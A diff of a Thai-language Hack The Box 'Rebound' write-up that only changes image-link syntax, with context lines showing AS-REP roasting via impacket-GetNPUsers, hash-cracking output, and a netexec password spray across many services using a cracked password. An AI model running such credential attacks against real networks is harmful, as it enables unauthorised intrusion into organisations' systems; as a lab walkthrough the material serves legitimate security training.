@@ -156,7 +156,7 @@ delegator$
 ```bash
 impacket-GetNPUsers -usersfile users rebound.htb/ -dc-ip 10.10.11.231 
 ```
-![[Challenge/HTB Challenge/Rebound/IMG/001.png]]
+![](./IMG/001.png)
 
 เราได้ข้อมูลของ as-rep hash กลับมาแต่เมื่อทดสอบ Crack จะพบว่าไม่สามารถ Crack ได้ 
 
@@ -196,14 +196,14 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
 
-![[Challenge/HTB Challenge/Rebound/IMG/002.png]]
+![](./IMG/002.png)
 
 # Password Spray 
 ```bash 
 for service in wmi winrm smb mssql rdp ssh ldap ftp vnc; do netexec $service rebound.htb  -u users -p '1GR8t@$$4u' --continue-on-success ; done
 ```
-![[Challenge/HTB Challenge/Rebound/IMG/004.png]]
-![[Challenge/HTB Challenge/Rebound/IMG/003.png]]
+![](./IMG/004.png)
+![](./IMG/003.png)
 
 # Collect Bloodhound 
 ```bash
